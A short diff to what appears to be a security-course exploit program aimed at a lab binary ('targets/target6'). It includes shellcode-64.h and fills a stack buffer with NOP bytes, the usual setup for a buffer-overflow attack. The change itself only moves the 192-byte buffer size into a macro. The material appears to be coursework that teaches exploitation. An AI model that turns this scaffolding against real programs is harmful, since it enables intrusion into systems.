@@ -5,6 +5,7 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target6"
+#define LENGTH 192
 
 int main(void)
 {
@@ -12,7 +13,7 @@ int main(void)
   char *env[1];
 
   // Start
-  char buf[192];
+  char buf[LENGTH];
 
   // Fill up the buffer with NOP
   for (int i = 0; i < 192; i++) {
